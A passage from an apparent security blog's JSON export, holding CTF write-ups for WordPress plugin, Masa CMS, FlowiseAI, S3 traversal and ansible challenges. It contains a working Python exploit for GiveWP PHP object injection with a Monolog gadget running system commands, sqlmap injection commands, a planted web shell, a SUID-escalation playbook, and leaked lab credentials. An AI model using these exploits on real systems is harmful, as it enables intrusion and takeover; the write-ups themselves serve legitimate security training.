plugin_basename( __FILE__ ) ); add_action(\u0026#34;wp_ajax_nopriv_uptoyou\u0026#34;, \u0026#34;uptoyou\u0026#34;); function uptoyou(){ $option_name = $_POST[\u0026#34;option_name\u0026#34;]; $nope = array(\u0026#39;users_can_register\u0026#39;, \u0026#39;auto_update_core_minor\u0026#39;, \u0026#39;auto_update_core_dev\u0026#39;, \u0026#39;upload_url_path\u0026#39;, \u0026#39;mailserver_pass\u0026#39;, \u0026#39;wp_user_roles\u0026#39;, \u0026#39;template\u0026#39;, \u0026#39;blog_public\u0026#39;, \u0026#39;html_type\u0026#39;, \u0026#39;sticky_posts\u0026#39;, \u0026#39;use_balanceTags\u0026#39;, \u0026#39;page_for_posts\u0026#39;, \u0026#39;permanent-links\u0026#39;, \u0026#39;hack_file\u0026#39;, \u0026#39;multisite\u0026#39;, \u0026#39;comment_max_links\u0026#39;, \u0026#39;mailserver_login\u0026#39;, \u0026#39;use_trackback\u0026#39;, \u0026#39;comments_per_page\u0026#39;, \u0026#39;default_pingback_flag\u0026#39;, \u0026#39;siteurl\u0026#39;, \u0026#39;enable_app\u0026#39;, \u0026#39;large_size_w\u0026#39;, \u0026#39;default_comments_page\u0026#39;, \u0026#39;default_comment_status\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;moderation_keys\u0026#39;, \u0026#39;sidebars_widgets\u0026#39;, \u0026#39;posts_per_page\u0026#39;, \u0026#39;links_updated_date_format\u0026#39;, \u0026#39;default_role\u0026#39;, \u0026#39;theme\u0026#39;, \u0026#39;advanced_edit\u0026#39;, \u0026#39;image_default_link_type\u0026#39;, \u0026#39;blogname\u0026#39;, \u0026#39;thumbnail_size_w\u0026#39;, \u0026#39;admin_email\u0026#39;, \u0026#39;enable_xmlrpc\u0026#39;, \u0026#39;rss_use_excerpt\u0026#39;, \u0026#39;require_name_email\u0026#39;, \u0026#39;comment_whitelist\u0026#39;, \u0026#39;medium_large_size_h\u0026#39;, \u0026#39;show_comments_cookies_opt_in\u0026#39;, \u0026#39;comment_order\u0026#39;, \u0026#39;use_balancetags\u0026#39;, \u0026#39;close_comments_for_old_posts\u0026#39;, \u0026#39;gzipcompression\u0026#39;, \u0026#39;use_smilies\u0026#39;, \u0026#39;upload_path\u0026#39;, \u0026#39;moderation_notify\u0026#39;, \u0026#39;close_comments_days_old\u0026#39;, \u0026#39;medium_size_w\u0026#39;, \u0026#39;show_on_front\u0026#39;, \u0026#39;reading\u0026#39;, \u0026#39;show_avatars\u0026#39;, \u0026#39;default_post_format\u0026#39;, \u0026#39;site_icon\u0026#39;, \u0026#39;comments_notify\u0026#39;, \u0026#39;adminhash\u0026#39;, \u0026#39;gmt_offset\u0026#39;, \u0026#39;rewrite_rules\u0026#39;, \u0026#39;rss_language\u0026#39;, \u0026#39;thread_comments_depth\u0026#39;, \u0026#39;permalink_structure\u0026#39;, \u0026#39;default_category\u0026#39;, \u0026#39;links_recently_updated_append\u0026#39;, \u0026#39;thread_comments\u0026#39;, \u0026#39;home\u0026#39;, \u0026#39;widget_categories\u0026#39;, \u0026#39;use_linksupdate\u0026#39;, \u0026#39;default_post_edit_rows\u0026#39;, \u0026#39;comment_moderation\u0026#39;, \u0026#39;start_of_week\u0026#39;, \u0026#39;wp_page_for_privacy_policy\u0026#39;, \u0026#39;date_format\u0026#39;, \u0026#39;widget_text\u0026#39;, \u0026#39;active_plugins\u0026#39;, \u0026#39;avatar_default\u0026#39;, \u0026#39;timezone_string\u0026#39;, \u0026#39;auto_update_core_major\u0026#39;, \u0026#39;default_ping_status\u0026#39;, \u0026#39;tag_base\u0026#39;, \u0026#39;media\u0026#39;, \u0026#39;widget_rss\u0026#39;, \u0026#39;general\u0026#39;, \u0026#39;time_format\u0026#39;, \u0026#39;large_size_h\u0026#39;, \u0026#39;others\u0026#39;, \u0026#39;embed_size_w\u0026#39;, \u0026#39;posts_per_rss\u0026#39;, \u0026#39;image_default_size\u0026#39;, \u0026#39;mailserver_url\u0026#39;, \u0026#39;fileupload_maxk\u0026#39;, \u0026#39;page_comments\u0026#39;, \u0026#39;links_recently_updated_time\u0026#39;, \u0026#39;thumbnail_size_h\u0026#39;, \u0026#39;page_on_front\u0026#39;, \u0026#39;uploads_use_yearmonth_folders\u0026#39;, \u0026#39;ping_sites\u0026#39;, \u0026#39;comment_registration\u0026#39;, \u0026#39;thumbnail_crop\u0026#39;, \u0026#39;medium_large_size_w\u0026#39;, \u0026#39;recently_edited\u0026#39;, \u0026#39;image_default_align\u0026#39;, \u0026#39;avatar_rating\u0026#39;, \u0026#39;links_recently_updated_prepend\u0026#39;, \u0026#39;new_admin_email\u0026#39;, \u0026#39;comments\u0026#39;, \u0026#39;embed_size_h\u0026#39;, \u0026#39;default_email_category\u0026#39;, \u0026#39;embed_autourls\u0026#39;, \u0026#39;stylesheet\u0026#39;, \u0026#39;blacklist_keys\u0026#39;, \u0026#39;https_detection_errors\u0026#39;, \u0026#39;medium_size_h\u0026#39;, \u0026#39;category_base\u0026#39;, \u0026#39;blogdescription\u0026#39;, \u0026#39;avatars\u0026#39;, \u0026#39;mailserver_port\u0026#39;, \u0026#39;default_link_category\u0026#39;, \u0026#39;secret\u0026#39;, \u0026#39;writing\u0026#39;, \u0026#39;blog_charset\u0026#39;); if(!in_array($option_name, $nope)){ update_option($option_name, wp_json_encode($_POST[\u0026#34;option_value\u0026#34;])); } echo \u0026#34;option updated\u0026#34;; } The plugin only containing this single file. It will register ajax action where we can update any options in the wordpress. However the value was in JSON format due to wp_json_encode function.\ndue to json encode, we can\u0026rsquo;t enable options that require integer value such as users_can_register. We also can\u0026rsquo;t controll options that require string format becausee wp_json_encode always gives additional double quote in the database.\nThere were a lot of blacklisted options. But as we solve previous challenges, we know that we can also bypass the blacklist using %01 or \\u0001 characters.\nThat\u0026rsquo;s all for the custom plugin, now let\u0026rsquo;s analyze the other two plugins. Here we found a lot of WP Rest route, but rest api from slim-seo is protected by role and permissions. Since we dont have any credentials, and we can\u0026rsquo;t register, we can only search for unauthenticated rest. Luckily, rest api from squirrly-seo doesn\u0026rsquo;t check for permissions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 public function hookInit() { if ( SQ_Classes_Helpers_Tools::getOption( \u0026#39;sq_api\u0026#39; ) == \u0026#39;\u0026#39; ) { return; } if ( ! SQ_Classes_Helpers_Tools::getOption( \u0026#39;sq_cloud_connect\u0026#39; ) ) { return; } $this-\u0026gt;token = SQ_Classes_Helpers_Tools::getOption( \u0026#39;sq_cloud_token\u0026#39; ); //Change the rest api if needed add_action( \u0026#39;rest_api_init\u0026#39;, array( $this, \u0026#39;sqApiInit\u0026#39; ) ); } function sqApiInit() { if ( function_exists( \u0026#39;register_rest_route\u0026#39; ) ) { register_rest_route( $this-\u0026gt;namespace, \u0026#39;/indexnow/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;indexUrl\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); register_rest_route( $this-\u0026gt;namespace, \u0026#39;/save/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;savePost\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); register_rest_route( $this-\u0026gt;namespace, \u0026#39;/get/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;getData\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); register_rest_route( $this-\u0026gt;namespace, \u0026#39;/test/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;testConnection\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); // load deprecate API for compatibility $this-\u0026gt;deprecateRest(); } } /* * Deprecate since version 12.1.10 */ public function deprecateRest() { register_rest_route( \u0026#39;save\u0026#39;, \u0026#39;/squirrly/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;savePost\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); register_rest_route( \u0026#39;test\u0026#39;, \u0026#39;/squirrly/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::EDITABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;testConnection\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); register_rest_route( \u0026#39;get\u0026#39;, \u0026#39;/squirrly/\u0026#39;, array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;getData\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ) ); } as can be seen in the hookInit method, the rest api only registered once several value is available in the options.\nif we checks on /wp-json, we can\u0026rsquo;t see any of those rest api as well. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 defined( \u0026#39;SQ_OPTION\u0026#39; ) || define( \u0026#39;SQ_OPTION\u0026#39;, \u0026#39;sq_options\u0026#39; ); # yoinked from config.php public static function getOptions() { if ( is_multisite() ) { self::$options = json_decode( get_blog_option( get_main_site_id(), SQ_OPTION ), true ); } else { self::$options = json_decode( get_option( SQ_OPTION ), true ); } return self::$options; } public static function getOption($key) { if (!isset(self::$options[$key])) { self::$options = self::getOptions(); if (!isset(self::$options[$key])) { self::$options[$key] = false; } } return apply_filters(\u0026#39;sq_option_\u0026#39; . $key, self::$options[$key]); } The function used to obtain sq_options value from database, then perform json decode. hmmm, json decode? sounds great!\nHere\u0026rsquo;s the beautified json config looks like So we need to set sq_api value to anything than empty string, sq_cloud_connect to true, and sq_cloud_token to our controlled string.\nwe can do this with following ajax action\nnow the rest api successfully registered!\nNow we can continue with the rest api callback. One of the interesting callback is getData where it can be used to retrieve post informations based on postId\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 public function getData( WP_REST_Request $request ) { global $wpdb; $response = array(); SQ_Classes_Helpers_Tools::setHeader( \u0026#39;json\u0026#39; ); //get the token from API $token = $request-\u0026gt;get_param( \u0026#39;token\u0026#39; ); if ( $token \u0026lt;\u0026gt; \u0026#39;\u0026#39; ) { $token = sanitize_text_field( $token ); } if ( ! $this-\u0026gt;token || $this-\u0026gt;token \u0026lt;\u0026gt; $token ) { exit( wp_json_encode( array( \u0026#39;error\u0026#39; =\u0026gt; esc_html__( \u0026#34;Connection expired. Please try again.\u0026#34;, \u0026#39;squirrly-seo\u0026#39; ) ) ) ); } $select = $request-\u0026gt;get_param( \u0026#39;select\u0026#39; ); switch ( $select ) { case \u0026#39;innerlinks\u0026#39;: # SNIFFED case \u0026#39;keyword\u0026#39;: # SNIFFED case \u0026#39;posts\u0026#39;: # SNIFFED case \u0026#39;post\u0026#39;: $id = (int) $request-\u0026gt;get_param( \u0026#39;id\u0026#39; ); if ( $id == 0 ) { wp_send_json_error( esc_html__( \u0026#34;Wrong Params\u0026#34;, \u0026#39;squirrly-seo\u0026#39; ) ); } //get Squirrly SEO post metas if ( $post = SQ_Classes_ObjController::getClass( \u0026#39;SQ_Models_Snippet\u0026#39; )-\u0026gt;setPostByID( $id ) ) { $response = $post-\u0026gt;toArray(); } break; case \u0026#39;squirrly\u0026#39;: # SNIFFED } echo wp_json_encode( $response ); exit(); } however in order to access this route, we need to input token parameter which will be compared with token in the config. As we already set the token before, we can directly access this routes.\nWe need to perform little bruteforce here to find the correct postid where flag is stored. I found the private post in id 5.\nFlag Obtained!\nFlag: CTF{up_to_you_how_to_get_the_flag_7cdd34392012dd}\nGive Who give me ?\nThis is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\nIn this challenge, two plugins were given. give and rollbar\nPatchstack recently published article about GiveWP Unauthenticated Object Injection\nIn the current version of GiveWP, there were no POP Gadget that can be used to achieve RCE. However we have rollbar plugin which contains POP Gadget for Monolog. The same plugin also used in previous Patchstack CTF.\nIn the post, it was mentioned that previous fix for CVE-2024-5932 or validation in isSerialized method can be bypassed using emojies. The validation will return False due to emoji bypass, and the final value (before being inserted into the database) is sanitized using the sanitize_text_field function, which will remove the emojis from the user input. Thus, a serialized object is inserted into the database.\n1 2 3 4 5 6 7 8 9 10 11 12 function give_clean($var, $allow_serialized_data = false) { if (is_array($var)) { return array_map(\u0026#39;give_clean\u0026#39;, $var); } if ( Utils::isSerialized($var)) { $var = $allow_serialized_data ? Utils::safeUnserialize($var) : \u0026#39;\u0026#39;; } return is_scalar($var) ? sanitize_text_field(wp_unslash($var)) : $var; } When the value is retrieved from database (using get_meta function), it will try to unserialize the value. Thus giving us Object Injection Vulnerability, sweat ðŸ˜‹\nIn order to know where should we put the emoji bypass, we need to look at the validation code. As can be seen below, it try to detect several serialized pattern. This pattern can be bypassed by replacing (for example) O:DIGIT with O:emojiDIGIT\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public static function isSerialized($data): bool { $data = self::removeBackslashes($data); if (is_serialized($data) || self::containsSerializedDataRegex($data)) { return true; } return false; } public static function containsSerializedDataRegex($data): bool { if ( ! is_string($data)) { return false; } $pattern = \u0026#39;/ (a:\\d+:\\{.*\\}) | # Matches arrays (e.g: a:2:{i:0;s:5:\u0026#34;hello\u0026#34;;i:1;i:42;}) (O:\\d+:\u0026#34;[^\u0026#34;]+\u0026#34;:\\{.*\\}) | # Matches objects (e.g: O:8:\u0026#34;stdClass\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;James\u0026#34;;}) (s:\\d+:\u0026#34;[^\u0026#34;]*\u0026#34;;) | # Matches strings (e.g: s:5:\u0026#34;hello\u0026#34;;) (i:\\d+;) | # Matches integers (e.g: i:42;) (b:[01];) | # Matches booleans (e.g: b:1; or b:0;) (d:\\d+(\\.\\d+)?;) | # Matches floats (e.g: d:3.14;) (N;) # Matches NULL (e.g: N;) /x\u0026#39;; return preg_match($pattern, $data) === 1; } Ok, so now how can we insert the payload?ðŸ¤”\nLuckily, in the fresh installation of GiveWP plugins, there was a default Donation page. It can be accessed within /?give_forms=givewp-donation-form By inserting all required data, we should able to get POST requests below.\nNest step is to create serialized gadget. I\u0026rsquo;ll use phpggc to create the POP Gadget Chain payload.\nIn order to send the crafted exploit, i\u0026rsquo;ll use python script below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import requests from urllib.parse import unquote, quote from re import search url = \u0026#34;http://52.77.81.199:9140/?givewp-route=donate\u0026amp;givewp-route-signature=7be844822138dbd619d31db7e8b9cf02\u0026amp;givewp-route-signature-id=givewp-donate\u0026amp;givewp-route-signature-expiration=1740489610\u0026#34; headers = { \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.9\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\u0026#34;, } popGadget = unquote(\u0026#34;O%3A37%3A%22Monolog%5CHandler%5CFingersCrossedHandler%22%3A4%3A%7Bs%3A16%3A%22%00%2A%00passthruLevel%22%3Bi%3A0%3Bs%3A10%3A%22%00%2A%00handler%22%3Br%3A1%3Bs%3A9%3A%22%00%2A%00buffer%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22cat%20%2Ff%2A%22%3Bs%3A5%3A%22level%22%3Bi%3A0%3B%7D%7Ds%3A13%3A%22%00%2A%00processors%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22pos%22%3Bi%3A1%3Bs%3A6%3A%22system%22%3B%7D%7D\u0026#34;) emoji = quote(\u0026#34;ðŸ˜¼\u0026#34;) popGadget = popGadget.replace(\u0026#34;:\u0026#34;, \u0026#34;:\u0026#34; + emoji) popGadget = popGadget.replace(\u0026#34;N;\u0026#34;, \u0026#34;N\u0026#34; + emoji + \u0026#34;;\u0026#34;) # Multipart form-data payload files = { \u0026#34;amount\u0026#34;: (None, \u0026#34;10\u0026#34;), \u0026#34;currency\u0026#34;: (None, \u0026#34;USD\u0026#34;), \u0026#34;donationType\u0026#34;: (None, \u0026#34;single\u0026#34;), \u0026#34;formId\u0026#34;: (None, \u0026#34;9\u0026#34;), \u0026#34;gatewayId\u0026#34;: (None, \u0026#34;manual\u0026#34;), \u0026#34;firstName\u0026#34;: (None, popGadget), \u0026#34;lastName\u0026#34;: (None, \u0026#34;b\u0026#34;), \u0026#34;email\u0026#34;: (None, \u0026#34;aa@gmail.com\u0026#34;), \u0026#34;comment\u0026#34;: (None, \u0026#34;\u0026#34;), \u0026#34;donationBirthday\u0026#34;: (None, \u0026#34;\u0026#34;), \u0026#34;originUrl\u0026#34;: (None, \u0026#34;http://52.77.81.199:9140/?give_forms=givewp-donation-form\u0026#34;), \u0026#34;isEmbed\u0026#34;: (None, \u0026#34;true\u0026#34;), \u0026#34;embedId\u0026#34;: (None, \u0026#34;9\u0026#34;), \u0026#34;gatewayData[testGatewayIntent]\u0026#34;: (None, \u0026#34;test-gateway-intent\u0026#34;) } response = requests.post(url, headers=headers, files=files) match = search(r\u0026#34;CTF\\{.*?\\}\u0026#34;, response.text) if match: print(\u0026#34;Found:\u0026#34;, match.group()) else: print(\u0026#34;No flag found.\u0026#34;) Flag Obtained! Flag: CTF{g1v3_plug1n_keeps_g1v1ng_php_0bj3ct_1njection}\nOutro Patchstack CTF is getting harder in every iteration, but never getting out of unique ideas. I really love the concept of WordPress CTF challenges where i can improve my skills in wordpress hacking and also web hacking in general. I hope Patchstack will always keep with the good challenges. Kudos to all challenge authors and participant. See you on the next CTF ðŸ”¥ðŸ”¥\n","date":"2025-02-24T11:56:49+07:00","image":"https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/ctf-asia.jpg","permalink":"https://blog.lordrukie.com/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/","title":"Patchstack S02E01 - WordCamp Asia CTF Writeup"},{"content":"Fullpwn - Freedom In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.\nUser Enumeration starting with port canning, we found that the machine are running Windows due to kerberos port (88) opened.\nWeb Application I started to enumerate web apps, which redirected into /index.cfm. cfm file extension are used for ColdFusion. there\u0026rsquo;s nothing much in the landing page, which then i decided to perform directory scan. Here i found several interesting results such as /README.md and /admin In the README.md files, i found that web application running Masa CMS if we try to open the /admin path, then we can also confirm that Masa CMS is being used. continuing with the directory scan, i found other interesting files named box.json. It seems like version 7.4.5 or Masa CMS is being used right now.\nMasaCMS Exploit After searching for known exploit of Masa CMS, i found this interesting article by projectdiscovery which disclose about pre-auth sql injection in Masa CMS version 7.4.5. Perfect!\nThey also provide attack scenario to obtain RCE in the Masa CMS as well. Based on the article, it seems like the Masa CMS are vulnerable to error-based SQL Injection. So i use sqlmap to dump the database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;%5c\u0026#39;\u0026#34; --batch Alternatively, we can also view the database schema in the source code.\nIn order to achieve RCE, we need to reset user password. I use following command to dump user lists from database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;x%5c\u0026#39;\u0026#34; --batch --dump -D dbMasaCMS -T tusers it seems like admin email was admin@freedom.htb\nusing the email address, we can invoke password reset from the /admin endpoint.\nAfter that, we need to obtain reset token and user id from database. We didn\u0026rsquo;t know where exactly the value is, and try to dump all table in dbMasaCMS database instead.\nAfter waiting for a while, we found interesting output within tredirects table.\nThe url can be used to reset admin password, nice!\nCrafting MuraCMS Plugin in order to obtain code execution, we need to upload our own plugin. This can be performed under Plugins \u0026gt; Add Plugin menu. I was lazy to create the plugin from scratch, so i decided to search for public available plugin, which i found from the MasaCMS repository itself\nI replace the content of MasaGoogleSitemaps-main\\admin\\views\\main\\default.cfm using backdoor shell from laudanum.\nThen i zip the plugin content and uploaded it. However, it shows error like this.\nFortunately, this error can be ignored. I just need to back to previous page and click for update button.\nVoila, plugin is uploaded! To access the plugin, click on it\u0026rsquo;s name This will redirect into /plugins/MasaGoogleSitemaps/ with forbidden result, what?? Luckily, we can remove the restriction by appending /index.cfm to the site. Shell is now opened, however we can\u0026rsquo;t see the content due to access restriction in the shell itself. We need to set X-Auth-Code header with value taken from the source code. Shell can be accessed now WSL Escape? When i execute whoami, it returning root instead of windows user?? I easily guess that this is probably wsl. Using mount command, i found that this is indeed an wsl intances that mounting drive C:\\ from windows. We can access windows file\u0026rsquo;s from it. User flag also can be obtained within /mnt/c/Users/j.bret/Desktop/user.txt\nFlag: HTB{c4n_y0u_pl34as3_cr4ck?}\nRoot well, this is weird. But we can also read root flag using wsl privileges lol\nroot flag located in /mnt/c/Users/Administrator/Desktop/root.txt\nFlag:HTB{l34ky_h4ndl3rs_4th3_w1n}\n","date":"2024-12-19T02:22:27.837Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/banner.jpg","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/","title":"[HTB CTF University 2024] - Freedom"},{"content":"Fullpwn - Apolo In the lawless expanse of the Frontier Cluster, Apolo serves as a beacon of security, working to safeguard the Frontier Clusterâ€™s assets from bounty hunters.\nUser Enumeration port scan showing two active port, 22 and 80.\nUsing curl, i managed to obtain server name, which is apolo.htb.\nWeb Application i add the domain name into /etc/hosts and starting to enumerate the web pages In one of the link, i found a subdomain ai.apolo.htb FlowiseAI Exploit I add the subdomain into /etc/hosts and starting to access the site. It seems like it use FlowiseAI. It seems that FlowiseAI have authentication bypass vulnerability.\nusing the technique mentioned on the exploitdb, i managed to bypsas authentication and obtain credentials id.\n1 2 3 4 5 6 7 8 9 [ { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34; } ] The id can be used to read the value of mongodb creds. 1 2 3 4 5 6 7 8 9 10 { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;plainDataObj\u0026#34;: { \u0026#34;mongoDBConnectUrl\u0026#34;: \u0026#34;mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true\u0026amp;w=majority\u0026#34; } } There\u0026rsquo;s pair of credentials there, which is lewis:C0mpl3xi3Ty!_W1n3.\nThe credentials can be used to logged in using ssh.\nFlag: HTB{llm_ex9l01t_4_RC3}\nRoot Our current user have permission to run rclone as root using sudo.\nUnfortunately, rclone is not listed in GTFOBins site Then i try to check for it\u0026rsquo;s docouomentation, and found that it have cat options that can be used to read files. I can easily read root flag using following command. Flag: HTB{cl0n3_rc3_f1l3}\n","date":"2024-12-19T02:16:44.843Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/","title":"[HTB CTF University 2024] - Apolo"},{"content":"Fullpwn - Clouded In the lawless expanse of the Frontier Cluster, Clouded emerges as a beacon of efficiency and security for file sharing. Breakthrough their cloud servers to obtain the secrets to finding the Starry Spur. Allow up to 1 minute for all the services to properly boot.\nUser Enumeration Upon scanning the ports, we found that port 22 and 80 are open.\nwhen try to access the port 80, it was redirected into clouded.htb. We try to enumerate subdomain using ffuf command below, and found other subdomain named local.clouded.htb we add those two hostnames into /etc/hosts.\nWeb application The web page have several page, but the intersting one is Upload page. It allows user to upload several type of content. If we try to upload any content, it will return uploaded file location from local.clouded.htb subdomain. Cloud instances Using curl, i was able to identify that the site was hosted using aws, probably an s3 bucket I try to use aws-cli to enumerate the instances further, however i got permission denied i then try to enumerate further, started with directory enumration. I found that the application accept urlencoded form of ?. and after playing with other character, i noticed that the site also vulnerable to directory traversal, which allow me to bypass the restriction and access the bucket. it have file named backup.db which can be downloaded directly using link below http://local.clouded.htb/uploads/..%2F/clouded-internal/backup.db\nthe backup contains a lot of name and password in md5 format. SSH Bruteforce i managed to crack all the password and proceeding to create wordlists based on available information.\ni\u0026rsquo;ve tried multiple username combination based on username-anarchy. but in the end, the pair was simple. It was lastname:password.\nI managed to obtain correct credentials, which was nagato:alicia\nflag was located in /home/nagato/flag.txt\nRoot After obtaining low privilege user, i try to enumerate further. Aparently, nagato is part of frontiers group, which have access for /opt/infra-setup. It containing yml script, potentially used for healthcheck. If we try to monitor any process using pspy, then we can see that root user are running ansible using yml file mentioned before. ansible-playbook rce Using script from 0xdf, we can gain command execution using following yml code. Note that i made modification because i was lazy to setup reverse shell in my windows machine lol.\n1 2 3 4 - hosts: localhost tasks: - name: rev shell: bash -c \u0026#39;chmod u+s /bin/bash\u0026#39; since we dont have write permission into checkup.yml, we can\u0026rsquo;t modify the file directly. However since we have write permission on the directory itself, we can delete or rename the file into something else. This way, we can create new file with name of checkup.yml and inject the malicious script. After waiting for a while, the /bin/bash permission was modified into a SUID binary. Now we can obtain root shell by executing /bin/bash -p\nroot flag obtained! Flag: HTB{H@ZY_71ME5_AH3AD}\n","date":"2024-12-18T22:16:07+07:00","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/","title":"[HTB CTF University 2024] - Clouded"},{"content":"Web - Intergalactic Bounty The Galactic Bounty Exchangeâ€”a system where hunters and hunted collide, controlled by the ruthless Frontier Board. Hidden within its encrypted core lies a prize of untold power: the bounty for the Starry Spur. To ignite rebellion, Jack Colt must infiltrate this fortress of contracts, manipulate its algorithms, and claim the Spurâ€™s bounty for himself. A race against time, a battle against the galaxyâ€™s deadliest systemâ€”Jackâ€™s mission will decide the fate of the Frontier.\nAnalaysis We are given nodejs application and email service with address of test@email.htb. The setup were pretty much like Armaxis.\nBased on the flag location in the source code, we need to obtain at least arbitrary file read or command execution in the application.\n1 COPY flag.txt / Bot Bot was found within the source code. It means there\u0026rsquo;s probably a client side vulnerability such as CSRF, XSS, and others.\nusing bot is the intended way to solve the challenge, however i\u0026rsquo;m using unintended solution to solve the problem\nEmail Discrepancy \u0026amp; Privilege Escalation In order to log in to the application, users need to register with the interstellar.htb domain. However, our accessible email domain is email.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const emailAddresses = require(\u0026#39;email-addresses\u0026#39;); const registerAPI = async (req, res) =\u0026gt; { const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; const emailDomain = emailAddresses.parseOneAddress(email)?.domain; if (!emailDomain || emailDomain !== \u0026#39;interstellar.htb\u0026#39;) { return res.status(200).json({ message: \u0026#39;Registration is not allowed for this email domain\u0026#39; }); } try { await User.createUser(email, password, role); return res.json({ message: \u0026#34;User registered. Verification email sent.\u0026#34;, status: 201 }); } catch (err) { return res.status(500).json({ message: err.message, status: 500 }); } }; If email whitelist can be bypassed, we can register as admin due to parameter pollution in request parser.\n1 const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; privilege escalation can be achieved using following request data upon registration.\n1 2 3 4 5 { \u0026#34;username\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } in order to beat the email parser, i try to read the documentation and source code of email-addresses, which i found several test cases of parseOneAddress successfull email format.\none of the 